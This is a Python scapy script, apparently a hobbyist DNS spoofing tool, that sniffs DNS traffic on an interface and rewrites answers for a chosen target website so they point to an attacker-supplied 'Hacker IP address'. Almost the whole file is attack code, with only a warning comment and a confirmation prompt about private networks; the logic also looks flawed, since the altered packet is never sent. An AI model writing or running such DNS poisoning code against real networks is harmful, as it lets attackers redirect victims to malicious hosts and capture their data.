#! /usr/bin/env python3
# run as sudo

# ----- DO NOT RUN IN PUBLIC NETWORK

from scapy.all import *
import sys, time, datetime
from datetime import datetime
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--website", dest="website",
                        help="Target Website")
    parser.add_argument("-i", "--ip-address", dest="ip",
                        help="Hacker IP address")
    parser.add_argument("-I", "--Interface", dest="Interface",
                        help="Network Interface")
    opt = parser.parse_args()
    return opt

def sniffer(pkt):
    pkt_time = pkt.sprintf('%sent.time%')
    
    try:
        if DNSQR in pkt and pkt.dport == 53:
            print('[**] Detected DNS QR Message at: ' + pkt_time)
            poisoner(pkt)
            # pkt[IP].src = "192.168.1.1"
            # print(pkt.show())

        elif DNSRR in pkt and pkt.sport == 53:
            print('[**] Detected DNS RR Message at: ' + pkt_time)
            # print(pkt[DNS].an.show())

    except:
        pass

def poisoner(pkt):
    #### poison = IP(src=src , dst=dst , ttl=128 )/UDP(dport=53)/DNS(rd=1 , qd=DNSQR(qname=qname ,qtype=qtype))
    qname = pkt[DNSQR].qname.decode()
    opt = get_arguments()
    # dns_id = pkt.id
    
    if DNSRR in pkt:
        if opt.website in qname:
            dns_responce = DNSRR(rrname=qname, rdata=opt.ip)
            pkt[DNS].an = dns_responce
            pkt[DNS].ancount = 1

            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].len
            del pkt[UDP].chksum
            print(pkt.show())

if __name__ == "__main__":
    try:
        opt = get_arguments()
        gate = input("[WARNING] Make Sure Selected Interface is in PRIVATE NETWORK!![yN]")
        if gate == "y" or gate == "Y":
            filter_bpf = 'udp and port 53'
            sniff(iface=opt.Interface, filter=filter_bpf, store=0,  prn=sniffer)
    except:
        sys.exit(1)